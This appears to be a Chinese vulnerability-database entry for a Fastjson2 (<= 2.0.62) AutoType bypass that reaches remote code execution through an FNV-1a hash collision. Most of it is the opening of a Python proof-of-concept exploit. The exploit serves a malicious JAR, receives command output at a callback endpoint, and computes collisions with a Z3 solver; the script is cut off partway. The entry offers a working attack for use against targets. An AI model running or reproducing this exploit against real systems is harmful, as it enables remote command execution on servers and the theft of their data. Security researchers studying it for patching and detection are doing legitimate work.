# Fastjson2FNV-1a哈希碰撞AutoType绕过远程代码执行漏洞

- **系统**：Fastjson2FNV　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title = "Fastjson2 FNV-1a Collision RCE | automated lab PoC"`
- **请求**：`GET  /* → 分发恶意 JAR（Stage 1 下载）`

**请求体 / payload**
```
#!/usr/bin/env python3
"""
Fastjson2 FNV-1a Collision RCE — compact automated lab PoC
保留原版的碰撞、JAR 分发、Stage 1、Stage 2 和回传逻辑，压缩控制台输出。
碰撞使用 Z3 SMT solver + 5 个 Unicode 字符，无需预计算数据库。
HTTP Server 同时承担：
POST /cb → 接收命令回传（base64/hex/raw 自动解码）
Usage:
python3 fastjson_exploit_z3_compact.py http://target:9080/api/object
python3 fastjson_exploit_z3_compact.py http://target:9080/api/object -c "id"
python3 fastjson_exploit_z3_compact.py http://target:9080/api/object -i 1.2.3.4 -p 8888 --fd-start 30 --fd-max 80 -w 8
Dependencies:
pip install z3-solver requests
"""
import argparse, base64, http.server, json, os, signal, socket, struct, sys
import threading, time, zipfile
from concurrent.futures import ProcessPoolExecutor, as_completed
from io import BytesIO
from urllib.parse import urlparse
for _mod, _pkg in [("z3", "z3-solver"), ("requests", "requests")]:
try:
__import__(_mod)
except ImportError:
sys.exit(f"[!] Missing: pip install {_pkg}")
import z3
import requests
# ======================== Constants ========================
TARGET_HASH = -6293031534589903644       # 0xA8AAA929446FFCE4
FNV_OFFSET  = 0xCBF29CE484222325
FNV_PRIME   = 0x100000001B3
M64         = 0xFFFFFFFFFFFFFFFF
# ======================== FNV-1a-64 ========================
def fnv1a(s):
h = FNV_OFFSET
for c in s:
x = ord(c)
if x == 0x24:
x = 0x2E
h = ((h ^ x) * FNV_PRIME) & M64
return h
# ======================== Z3 Collision Solver ========================
def z3_collision(prefix, n=5):
state = fnv1a(prefix)
ctx = z3.Cont…（脚本共 14305 字，完整版见原文）
```
- **预期**：200　|　—

**其他**
- 版本: <= 2.0.62